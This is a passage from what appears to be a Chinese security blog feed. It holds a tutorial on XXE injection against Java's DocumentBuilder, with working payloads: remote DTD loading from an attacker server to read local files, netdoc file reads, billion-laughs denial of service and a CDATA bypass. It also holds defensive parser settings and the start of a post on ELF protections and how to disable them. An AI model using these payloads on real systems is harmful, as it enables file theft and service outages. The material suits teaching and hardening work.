File f = <span class="keyword">new</span> File(<span class="string">"user.xml"</span>);</span><br><span class="line">        documentBuilder(f);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">documentBuilder</span><span class="params">(File f)</span></span>&#123;</span><br><span class="line">        DocumentBuilderFactory factory=DocumentBuilderFactory.newInstance();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            DocumentBuilder builder=factory.newDocumentBuilder();</span><br><span class="line">            <span class="comment">//解析xml文档，先获取</span></span><br><span class="line">            Document doc=builder.parse(f);</span><br><span class="line">            <span class="comment">//通过user名字来获取dom节点</span></span><br><span class="line">            NodeList nodeList=doc.getElementsByTagName(<span class="string">"user"</span>);</span><br><span class="line">            Element e=(Element)nodeList.item(<span class="number">0</span>);</span><br><span class="line">            <span class="comment">//获取值</span></span><br><span class="line">            System.out.println(<span class="string">"姓名："</span>+e.getElementsByTagName(<span class="string">"name"</span>).item(<span class="number">0</span>).getFirstChild().getNodeValue());</span><br><span class="line">            System.out.println(<span class="string">"性别："</span>+e.getElementsByTagName(<span class="string">"sex"</span>).item(<span class="number">0</span>).getFirstChild().getNodeValue());</span><br><span class="line">            System.out.println(<span class="string">"年龄："</span>+e.getElementsByTagName(<span class="string">"age"</span>).item(<span class="number">0</span>).getFirstChild().getNodeValue());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行后，发现成功解析了user.xml的内容：</p><p><img src="/2019/02/13/XML注入之DocumentBuilder/1.png" alt="demo"></p><h2 id="XML注入漏洞验证"><a href="#XML注入漏洞验证" class="headerlink" title="XML注入漏洞验证"></a>XML注入漏洞验证</h2><h3 id="1、测试是否支持解析DTD："><a href="#1、测试是否支持解析DTD：" class="headerlink" title="1、测试是否支持解析DTD："></a>1、测试是否支持解析DTD：</h3><p>创建test.xml，内容如下，主要添加了DTD即DOCTYPE：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo&gt;</span><br><span class="line">&lt;user&gt;</span><br><span class="line">    &lt;name&gt;Mi1k7ea&lt;/name&gt;</span><br><span class="line">    &lt;sex&gt;male&lt;/sex&gt;</span><br><span class="line">    &lt;age&gt;20&lt;/age&gt;</span><br><span class="line">&lt;/user&gt;</span><br></pre></td></tr></table></figure><p>测试代码中将user.xml改为test.xml。</p><p>运行代码，效果和Demo一样，即说明支持解析DTD。</p><p>这里注意一点，当进行的是黑盒测试时，未返回Error不代表就是可以解析XML，但返回Error就肯定是不支持解析该XML，原因是服务端可能对Error进行了封装。</p><h3 id="2、测试是否支持解析普通实体："><a href="#2、测试是否支持解析普通实体：" class="headerlink" title="2、测试是否支持解析普通实体："></a>2、测试是否支持解析普通实体：</h3><p>修改test.xml内容如下，主要添加ELEMENT：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">        &lt;!ELEMENT foo EMPTY&gt;</span><br><span class="line">        ]&gt;</span><br><span class="line">&lt;user&gt;</span><br><span class="line">    &lt;name&gt;Mi1k7ea&lt;/name&gt;</span><br><span class="line">    &lt;sex&gt;male&lt;/sex&gt;</span><br><span class="line">    &lt;age&gt;20&lt;/age&gt;</span><br><span class="line">&lt;/user&gt;</span><br></pre></td></tr></table></figure><p>发现可以正常解析。</p><h3 id="3、测试是否支持解析参数实体："><a href="#3、测试是否支持解析参数实体：" class="headerlink" title="3、测试是否支持解析参数实体："></a>3、测试是否支持解析参数实体：</h3><p>修改test.xml内容如下，主要修改ELEMENT为ENTITY实体：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">        &lt;!ENTITY foo &quot;Entity can be hacked&quot;&gt;</span><br><span class="line">        ]&gt;</span><br><span class="line">&lt;user&gt;</span><br><span class="line">    &lt;name&gt;Mi1k7ea&lt;/name&gt;</span><br><span class="line">    &lt;sex&gt;&amp;foo;&lt;/sex&gt;</span><br><span class="line">    &lt;age&gt;20&lt;/age&gt;</span><br><span class="line">&lt;/user&gt;</span><br></pre></td></tr></table></figure><p>运行代码，发现可正常解析，且成功进行了XML实体注入：</p><p><img src="/2019/02/13/XML注入之DocumentBuilder/2.png" alt="demo"></p><h3 id="4、测试是否支持解析外部实体："><a href="#4、测试是否支持解析外部实体：" class="headerlink" title="4、测试是否支持解析外部实体："></a>4、测试是否支持解析外部实体：</h3><p>修改test.xml内容如下，主要修改为SYSTEM执行访问外部链接：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo SYSTEM &quot;http://192.168.17.136:8000/Mi1k7ea.dtd&quot;&gt;</span><br><span class="line">&lt;user&gt;</span><br><span class="line">    &lt;name&gt;Mi1k7ea&lt;/name&gt;</span><br><span class="line">    &lt;sex&gt;male&lt;/sex&gt;</span><br><span class="line">    &lt;age&gt;&amp;tea;&lt;/age&gt;</span><br><span class="line">&lt;/user&gt;</span><br></pre></td></tr></table></figure><p>在攻击者的服务器（这里自己开启一个Web服务）的Web目录放置一个Mi1k7ea.dtd文件，内容如下，读取本地C盘中的win.ini配置文件（若在Linux下读取”file:///etc/passwd”会报错，因为这种攻击方式受到XML中禁止字符的限制）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY tea SYSTEM &quot;file:///c:/windows/win.ini&quot;&gt;</span><br></pre></td></tr></table></figure><p>运行代码，在攻击者服务器看到目标程序访问了其中的恶意DTD文件：</p><p><img src="/2019/02/13/XML注入之DocumentBuilder/3.png" alt="demo"></p><p>发现成功通过远程加载解析DTD文件读取了本地文件内容：</p><p><img src="/2019/02/13/XML注入之DocumentBuilder/4.png" alt="demo"></p><p>当然，外部实体还有另一种写法，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">        &lt;!ENTITY % milk SYSTEM &quot;http://192.168.17.136:8000/Mi1k7ea.dtd&quot;&gt;</span><br><span class="line">        %milk;</span><br><span class="line">        ]&gt;</span><br><span class="line">&lt;user&gt;</span><br><span class="line">    &lt;name&gt;Mi1k7ea&lt;/name&gt;</span><br><span class="line">    &lt;sex&gt;male&lt;/sex&gt;</span><br><span class="line">    &lt;age&gt;&amp;tea;&lt;/age&gt;</span><br><span class="line">&lt;/user&gt;</span><br></pre></td></tr></table></figure><p>运行结果和上面是一样的。</p><p>至此，我们知道DocumentBuilder是存在XML注入风险的，并且在未设置有效防御措施的时候可支持解析外部实体，即可进行XML外部实体注入攻击(XXE)。</p><h2 id="XXE攻击利用"><a href="#XXE攻击利用" class="headerlink" title="XXE攻击利用"></a>XXE攻击利用</h2><p>其实前面的测试过程已经是一些利用方式了，如读取本地敏感文件等，但是前提是该XML注入是有回显的。</p><p>这里示例测试一些常用的，其他的更详细的以后遇到再补充吧。</p><h3 id="1、DoS攻击"><a href="#1、DoS攻击" class="headerlink" title="1、DoS攻击"></a>1、DoS攻击</h3><p>在Java中，XXE的DoS攻击只对低版本的JDK有效，而高版本的JDK会进行防御。</p><h4 id="（2）Billion-Laughs-攻击"><a href="#（2）Billion-Laughs-攻击" class="headerlink" title="（2）Billion Laughs 攻击"></a>（2）Billion Laughs 攻击</h4><p>经典的用于DoS的xml文件样例如下，原理为构造恶意的XML实体文件耗尽可用内存，因为许多XML解析器在解析XML文档时倾向于将它的整个结构保留在内存中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE lolz [</span><br><span class="line">        &lt;!ENTITY lol &quot;lol&quot;&gt;</span><br><span class="line">        &lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;</span><br><span class="line">        &lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;</span><br><span class="line">        &lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;</span><br><span class="line">        &lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;</span><br><span class="line">        &lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;</span><br><span class="line">        &lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;</span><br><span class="line">        &lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;</span><br><span class="line">        &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;</span><br><span class="line">        ]&gt;</span><br><span class="line">&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;</span><br></pre></td></tr></table></figure><p>这个在其他编程语言或者JDK版本较低的Java中可利用，但在高版本JDK的环境中会报错中断解析：</p><p><img src="/2019/02/13/XML注入之DocumentBuilder/6.png" alt="demo"></p><p>当然，这种类型的DoS攻击也支持参数实体的方式。将dos.xml修改如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE data SYSTEM &quot;http://192.168.17.136:8000/dos.dtd&quot; [</span><br><span class="line">&lt;!ELEMENT data (#PCDATA)&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;data&gt;&amp;tea;&lt;/data&gt;</span><br></pre></td></tr></table></figure><p>在攻击者服务器放置dos.dtd：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % a0 &quot;dos&quot; &gt;</span><br><span class="line">&lt;!ENTITY % a1 &quot;%a0;%a0;%a0;%a0;%a0;%a0;%a0;%a0;%a0;%a0;&quot;&gt;</span><br><span class="line">&lt;!ENTITY % a2 &quot;%a1;%a1;%a1;%a1;%a1;%a1;%a1;%a1;%a1;%a1;&quot;&gt;</span><br><span class="line">&lt;!ENTITY % a3 &quot;%a2;%a2;%a2;%a2;%a2;%a2;%a2;%a2;%a2;%a2;&quot;&gt;</span><br><span class="line">&lt;!ENTITY % a4 &quot;%a3;%a3;%a3;%a3;%a3;%a3;%a3;%a3;%a3;%a3;&quot;&gt;</span><br><span class="line">&lt;!ENTITY tea &quot;%a4;&quot; &gt;</span><br></pre></td></tr></table></figure><p>自己可更换低版本JDK进行测试，这里就不演示了。</p><h4 id="（2）支持实体测试"><a href="#（2）支持实体测试" class="headerlink" title="（2）支持实体测试"></a>（2）支持实体测试</h4><p>主要是利用普通实体ELEMENT，如果解析过程变的非常缓慢，则表明测试成功，即目标解析器配置不安全可能遭受至少一种DDoS攻击：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE data [</span><br><span class="line">&lt;!ELEMENT data (#ANY)&gt;</span><br><span class="line">&lt;!ENTITY a0 &quot;dos&quot; &gt;</span><br><span class="line">&lt;!ENTITY a1 &quot;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&quot;&gt;</span><br><span class="line">&lt;!ENTITY a2 &quot;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;data&gt;&amp;a2;&lt;/data&gt;</span><br></pre></td></tr></table></figure><h4 id="（3）XML-二次爆破-DDoS-攻击"><a href="#（3）XML-二次爆破-DDoS-攻击" class="headerlink" title="（3）XML 二次爆破 DDoS 攻击"></a>（3）XML 二次爆破 DDoS 攻击</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE data [</span><br><span class="line">&lt;!ENTITY a0 &quot;dosdosdosdosdosdos...dos&quot;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;data&gt;&amp;a0;&amp;a0;...&amp;a0;&lt;/data&gt;</span><br></pre></td></tr></table></figure><h4 id="（4）一般实体递归"><a href="#（4）一般实体递归" class="headerlink" title="（4）一般实体递归"></a>（4）一般实体递归</h4><p>最好不要使用递归：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE data [</span><br><span class="line">&lt;!ENTITY a &quot;a&amp;b;&quot; &gt;</span><br><span class="line">&lt;!ENTITY b &quot;&amp;a;&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;data&gt;&amp;a;&lt;/data&gt;</span><br></pre></td></tr></table></figure><h4 id="（5）外部一般实体"><a href="#（5）外部一般实体" class="headerlink" title="（5）外部一般实体"></a>（5）外部一般实体</h4><p>这种攻击方式是通过申明一个外部一般实体，然后引用位于网上或本地的一个大文件(例如：C:/pagefile.sys 或 /dev/random)。换句话说，就是让解析器解析一个 <strong>巨大的 XML 文件</strong>从而导致DoS。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&apos;1.0&apos;?&gt;</span><br><span class="line">&lt;!DOCTYPE data [</span><br><span class="line">&lt;!ENTITY dos SYSTEM &quot;file:///publicServer.com/largeFile.xml&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;data&gt;&amp;dos;&lt;/data&gt;</span><br></pre></td></tr></table></figure><h3 id="2、基本XXE攻击"><a href="#2、基本XXE攻击" class="headerlink" title="2、基本XXE攻击"></a>2、基本XXE攻击</h3><h4 id="有回显的XXE攻击"><a href="#有回显的XXE攻击" class="headerlink" title="有回显的XXE攻击"></a>有回显的XXE攻击</h4><p>这种攻击就是漏洞验证时利用的第3、4步的示例，如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">        &lt;!ENTITY foo &quot;Entity can be hacked&quot;&gt;</span><br><span class="line">        ]&gt;</span><br><span class="line">&lt;user&gt;</span><br><span class="line">    &lt;name&gt;Mi1k7ea&lt;/name&gt;</span><br><span class="line">    &lt;sex&gt;&amp;foo;&lt;/sex&gt;</span><br><span class="line">    &lt;age&gt;20&lt;/age&gt;</span><br><span class="line">&lt;/user&gt;</span><br></pre></td></tr></table></figure><p>但是这种攻击方式是需要一个直接的反馈通道即可以回显数据，并且读取文件受到XML中禁止字符的限制，如 “&lt;” 和 “&amp;”。如果这些被禁止的字符出现在要访问的文件中(如：/etc/fstab)，则 XML 解析器会抛出一个错误并停止解析。</p><h4 id="使用-netdoc-的-XXE-攻击"><a href="#使用-netdoc-的-XXE-攻击" class="headerlink" title="使用 netdoc 的 XXE 攻击"></a>使用 netdoc 的 XXE 攻击</h4><p>主要将file://换成netdoc:/，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE data [</span><br><span class="line">&lt;!ELEMENT data (#PCDATA)&gt;</span><br><span class="line">&lt;!ENTITY file SYSTEM &quot;netdoc:/etc/passwd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;data&gt;&amp;file;&lt;/data&gt;</span><br></pre></td></tr></table></figure><h3 id="3、绕过基本XXE攻击的限制"><a href="#3、绕过基本XXE攻击的限制" class="headerlink" title="3、绕过基本XXE攻击的限制"></a>3、绕过基本XXE攻击的限制</h3><p>bypass.xml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE data [</span><br><span class="line">    &lt;!ELEMENT data (#ANY)&gt;</span><br><span class="line">    &lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % goodies SYSTEM &quot;file://e:/passwd&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % end &quot;]]&gt;&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % dtd SYSTEM &quot;http://192.168.17.136:8000/bypass.dtd&quot;&gt;</span><br><span class="line">    %dtd;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;data&gt;&amp;all;&lt;/data&gt;</span><br></pre></td></tr></table></figure><p>bypass.dtd</p><h2 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h2><p>1、在Java项目中搜索javax.xml.parsers下的DocumentBuilderFactory和DocumentBuilder，排查是否使用了该API解析XML文档内容；</p><p>2、若使用了，则进一步排查是否禁用了不安全的操作，具体的是看setFeature()的设置是否存在绕过的可能。</p><h2 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h2><p>正确地设置setFeature()来进行防御，在创建出新的DocumentBuilderFactory实例之后就调用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">documentBuilder</span><span class="params">(File f)</span></span>&#123;</span><br><span class="line">    DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">//防御XML注入</span></span><br><span class="line">        factory.setFeature(<span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>, <span class="keyword">true</span>);</span><br><span class="line">        factory.setFeature(<span class="string">"http://xml.org/sax/features/external-general-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">        factory.setFeature(<span class="string">"http://xml.org/sax/features/external-parameter-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">        factory.setFeature(<span class="string">"http://apache.org/xml/features/nonvalidating/load-external-dtd"</span>, <span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line">        DocumentBuilder builder = factory.newDocumentBuilder();</span><br><span class="line">        <span class="comment">//解析xml文档，先获取</span></span><br><span class="line">        Document doc = builder.parse(f);</span><br><span class="line">        <span class="comment">//通过user名字来获取dom节点</span></span><br><span class="line">        NodeList nodeList = doc.getElementsByTagName(<span class="string">"user"</span>);</span><br><span class="line">        Element e = (Element)nodeList.item(<span class="number">0</span>);</span><br><span class="line">        <span class="comment">//获取值</span></span><br><span class="line">        System.out.println(<span class="string">"姓名："</span>+e.getElementsByTagName(<span class="string">"name"</span>).item(<span class="number">0</span>).getFirstChild().getNodeValue());</span><br><span class="line">        System.out.println(<span class="string">"性别："</span>+e.getElementsByTagName(<span class="string">"sex"</span>).item(<span class="number">0</span>).getFirstChild().getNodeValue());</span><br><span class="line">        System.out.println(<span class="string">"年龄："</span>+e.getElementsByTagName(<span class="string">"age"</span>).item(<span class="number">0</span>).getFirstChild().getNodeValue());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再次测试之前的payload，都没有成功：</p><p><img src="/2019/02/13/XML注入之DocumentBuilder/5.png" alt="demo"></p><p>至于setFeature()的详细配置可查阅：<a href="http://xerces.apache.org/xerces2-j/features.html" target="_blank" rel="noopener">http://xerces.apache.org/xerces2-j/features.html</a></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.freebuf.com/articles/web/97833.html" target="_blank" rel="noopener">DTD/XXE 攻击笔记分享</a></p><p><a href="https://www.cnblogs.com/backlion/p/9302528.html" target="_blank" rel="noopener">XML外部实体（XXE）注入详解</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;何为DocumentBuilder&quot;&gt;&lt;a href=&quot;#何为DocumentBuilder&quot; class=&quot;headerlink&quot; title=&quot;何为DocumentBuilder&quot;&gt;&lt;/a&gt;何为DocumentBuilder&lt;/h2&gt;&lt;p&gt;DocumentBu
      
    
    </summary>
    
      <category term="Java" scheme="https://Mi1k7ea.github.com/categories/Java/"/>
    
    
      <category term="Java" scheme="https://Mi1k7ea.github.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>ELF安全防御机制小结</title>
    <link href="https://Mi1k7ea.github.com/2019/02/09/ELF%E5%AE%89%E5%85%A8%E9%98%B2%E5%BE%A1%E6%9C%BA%E5%88%B6%E5%B0%8F%E7%BB%93/"/>
    <id>https://Mi1k7ea.github.com/2019/02/09/ELF安全防御机制小结/</id>
    <published>2019-02-09T03:30:47.000Z</published>
    <updated>2019-02-09T05:24:22.866Z</updated>
    
    <content type="html"><![CDATA[<p>这里主要介绍一下Linux下ELF文件的一些安全防御机制及其原理，其在二进制安全和Pwn上经常会碰到，至于各个类型的绕过技巧后面会补充。</p><h2 id="NX（DEP）"><a href="#NX（DEP）" class="headerlink" title="NX（DEP）"></a>NX（DEP）</h2><p>NX即No-eXecute（不可执行）的意思，NX（即Windows上类似的DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。</p><p>通常开启了NX后，即使有栈溢出漏洞也执行不了写在栈上的shellcode，但是可通过ROP方式来绕过NX跳转至其他地方执行。</p><p>gcc编译器默认开启了NX选项，如果需要关闭NX选项，可以给gcc编译器添加-z execstack参数。例如：gcc -z execstack -o test test.c</p><p>在Windows下，类似的概念为DEP（数据执行保护），在最新版的Visual Studio中默认开启了DEP编译选项。</p><p>网上找的示例图：</p><p><img src="/2019/02/09/ELF安全防御机制小结/1.jpg" alt="NX"></p><h2 id="PIE（ASLR）"><a href="#PIE（ASLR）" class="headerlink" title="PIE（ASLR）"></a>PIE（ASLR）</h2><p>PIE（Position-Independent Executables）位置无关的可执行文件，和Windows下的ASLR（Address Space Layout Randomization)机制类似，PIE enabled表示程序开启地址随机化选、意味着程序每次运行的时候地址都会变化，而如果没有开PIE的话那么No PIE (0x400000)，括号内的数据就是程序的基地址。</p><p>一般情况下NX（DEP）和PIE（ASLR）会同时工作。</p><p>PIE机制有以下三种情况：</p><p>​         0 - 表示关闭进程地址空间随机化。</p><p>​         1 - 表示将mmap的基址，stack和vdso页面随机化。</p><p>​         2 - 表示在1的基础上增加栈（heap）的随机化。</p><p>可以防范基于Ret2libc方式的针对DEP的攻击。ASLR和DEP配合使用，能有效阻止攻击者在堆栈上运行恶意代码。</p><p>Built as PIE：位置独立的可执行区域PIE。这样使得在利用缓冲溢出和移动操作系统中存在的其他内存崩溃缺陷时采用面向返回的编程ROP（return-oriented programming）方法变得难得多。</p><p>liunx下关闭PIE的命令如下：sudo -s echo 0 &gt; /proc/sys/kernel/randomize_va_space</p><h2 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h2><p>RELRO（Relocation Read Only）重定向只读，实现就是由linker指定binary的一块经过dynamic linker处理过 relocation之后的区域为只读。通过设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，保护库函数的调用不受攻击者重定位的影响，从而减少对GOT（Global Offset Table）攻击。</p><p>RELRO有Partial RELRO和FULL RELRO两个选项，如果开启FULL RELRO，意味着无法修改GOT表；如果为Partial RELRO，说明对GOT表具有写权限。</p><p>可通过ROP绕过。</p><h2 id="FORTIFY"><a href="#FORTIFY" class="headerlink" title="FORTIFY"></a>FORTIFY</h2><p>Fortify 技术是GCC在编译源码时判断程序的哪些buffer会存在可能的溢出，在buffer大小已知的情况下，GCC会把 strcpy、memcpy,、memset等函数自动替换成相应的 __strcpy_chk(dst, src, dstlen)等函数，达到防止缓冲区溢出的作用。</p><p>FORTIFY_SOURCE机制对格式化字符串有两个限制：</p><p>​    (1)包含%n的格式化字符串不能位于程序内存中的可写地址；</p><p>​    (2)当使用位置参数时，必须使用范围内的所有参数。例如要使用%4$x，则必须同时使用1、2、3。</p><p>GCC中-D_FORTIFY_SOURCE=2是默认开启的，但是只有开启O2或以上优化的时候，这个选项才会被真正激活。</p><p>如果指定-D_FORTIFY_SOURCE=1，那同样也要开启O1或以上优化，这个选项才会被真正激活。</p><p>可以使用-U_FORTIFY_SOURCE或者-D_FORTIFY_SOURCE=0来禁用。</p><p>如果开启了-D_FORTIFY_SOURCE=2，那么调用__printf_chk函数的时候会检查format string中是否存在%n，如果存在%n 而且format string是在一个可写的segment中的（不是在read-only内存段中），那么程序会报错并终止。如果是开启-D_FORTIFY_SOURCE=1，那么就不会报错。</p><h2 id="CANARY（Stack）"><a href="#CANARY（Stack）" class="headerlink" title="CANARY（Stack）"></a>CANARY（Stack）</h2><p>Stack，栈溢出检查，用Canary是否变化来检测，其中Canary found表示开启。</p><p>Canary是一种缓冲区溢出攻击缓解手段：启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux将cookie信息称为Canary。</p><p>如果栈中开启Canary 